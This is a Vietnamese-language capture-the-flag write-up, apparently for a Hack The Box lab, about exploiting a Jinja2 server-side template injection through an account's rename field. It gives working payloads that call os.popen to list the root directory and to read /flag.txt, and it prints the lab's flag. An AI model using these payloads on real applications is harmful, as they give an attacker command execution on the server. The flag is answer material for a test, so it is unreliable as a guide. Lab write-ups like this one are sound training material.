![image](https://github.com/user-attachments/assets/323154e0-d318-464a-a54d-2a025ffcb652)

# ANALYZE

Đây chính là 1 bài lab được dụng lại từ realcase từ report trên trang hackerone

https://hackerone.com/reports/1104349

https://hackerone.com/reports/125980

dựa vào bài báo cáo , thì t có thể kết luận bước đầu là trang web nhiễm lỗ hổng SSTI Jinja2 tại trường username


![image](https://github.com/user-attachments/assets/797cb1b9-c29f-4713-b66c-795b31859b4d)

![image](https://github.com/user-attachments/assets/8f55e9a2-f06e-4d19-bf75-a4ae72ba5775)

Nhưng ở lab dựng lại ở HTB đã filter đi phần nhập username , ta chỉ có thể nhập chữ cái và số , ta ko thể chèn kí tự của jinja2 vào.

nên tôi đã tạo 1 tài khoản bất kì , và trong giao diện có 1 chức năng giúp tôi đổi tên , và tôi đã đổi tên thành `{{7*7}}`

Và BOOM !

![image](https://github.com/user-attachments/assets/06c48fea-d2da-472f-9864-1d7b75a682ba)

# EXPLOIT

Tôi đã chèn đoạn payload này để liệt kê ra toàn bộ thư mục trên hệ thống : 
```
{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
```

```
Name: app bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

Bước còn lại thì đơn giản rồi 

```
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}
```

# FLAG

```
HTB{v3ry_e4sy_sst1_r1ght?_86aea1c45a605e765b441665365dcabf}
```

